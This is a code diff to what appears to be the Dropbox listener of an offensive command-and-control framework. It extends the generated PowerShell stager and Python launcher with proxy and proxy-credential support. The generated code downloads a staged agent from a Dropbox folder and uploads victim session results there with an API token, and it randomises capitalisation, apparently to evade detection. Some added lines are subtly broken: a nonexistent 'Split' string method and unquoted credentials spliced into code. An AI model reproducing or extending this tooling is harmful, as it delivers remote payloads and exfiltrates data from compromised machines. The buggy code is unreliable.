@@ -218,7 +218,15 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
-                            pass
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            domain = username.split('\\')[0]
+                            usr = username.split('\\')[1]
+                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+
+                        #save the proxy settings to use during the entire staging process and the agent
+                        stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
 
@@ -283,10 +291,29 @@ class Listener:
                 launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)
 
 
-                launcherBase += "if urllib2.getproxies():\n"
-                launcherBase += "   o = urllib2.build_opener();\n"
-                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
-                launcherBase += "   urllib2.install_opener(o);\n"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
@@ -501,8 +528,7 @@ class Listener:
             $wc = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $wc.Proxy = $Script:Proxy;
             $wc.Headers.Add("User-Agent", $script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -543,8 +569,7 @@ class Listener:
             # build the web request object
             $wc = New-Object System.Net.WebClient
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $wc.Proxy = $Script:Proxy;
             $wc.Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -566,6 +591,7 @@ class Listener:
                 }
 
                 $wc2 = New-Object System.Net.WebClient
+                $wc2.Proxy = $Script:Proxy;
                 $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                 $wc2.Headers.Add("Content-Type", "application/octet-stream")
                 $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
